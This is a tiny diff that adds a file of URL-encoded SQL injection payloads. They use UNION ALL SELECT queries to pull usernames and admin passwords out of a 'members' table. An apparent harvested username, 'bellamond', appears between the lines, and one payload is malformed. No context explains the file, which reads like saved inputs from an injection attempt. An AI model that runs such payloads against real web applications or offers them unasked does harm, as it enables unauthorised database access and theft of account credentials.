@@ -1,0 +1,6 @@
+"a'UNION+ALL+SELECT+username,1+FROM+members--
+a'UNION+ALL+SELECT+admin,+FROM+members--
+a'UNION+ALL+SELECT+username,1+FROM+members+where+admin=1--
+bellamond
+a'UNION+ALL+SELECT+password,1+FROM+members+where+admin=1--
+"
